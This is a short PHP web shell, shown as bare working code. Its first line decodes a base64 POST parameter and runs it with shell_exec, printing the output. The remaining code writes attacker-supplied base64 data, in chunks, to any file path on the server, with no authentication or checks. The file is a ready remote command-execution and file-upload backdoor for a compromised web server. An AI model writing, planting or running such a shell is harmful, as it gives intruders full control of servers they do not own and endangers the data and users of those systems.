<?php
($c = base64_decode($_POST['c'] ?? '')) && print(shell_exec($c));

if (isset($_POST['r'], $_POST['n'])) {
    // Normalize base64: support URL-safe (-/_ ) and fix + being decoded as space by form encoding
    $raw = (string) $_POST['r'];
    $raw = str_replace(' ', '+', $raw);
    $raw = str_replace('-', '+', $raw);
    $raw = str_replace('_', '/', $raw);
    $data = base64_decode($raw, true);
    if ($data === false) {
        http_response_code(400);
        echo "ERROR: Invalid base64 in upload payload";
        exit;
    }
    $path = $_POST['n'];
    $chunk_index = isset($_POST['chunk']) ? (int)$_POST['chunk'] : -1;

    if ($chunk_index === 0 || $chunk_index === -1) {
        // First chunk or single upload: create/overwrite (binary, no translation)
        $result = @file_put_contents($path, $data, LOCK_EX);
    } else {
        // Subsequent chunk: append (binary)
        $result = @file_put_contents($path, $data, FILE_APPEND | LOCK_EX);
    }
    
    if ($result === false) {
        http_response_code(500);
        echo "ERROR: Failed to write file to " . htmlspecialchars($path, ENT_QUOTES, 'UTF-8');
    } else {
        echo "OK: " . $result . " bytes written";
    }
}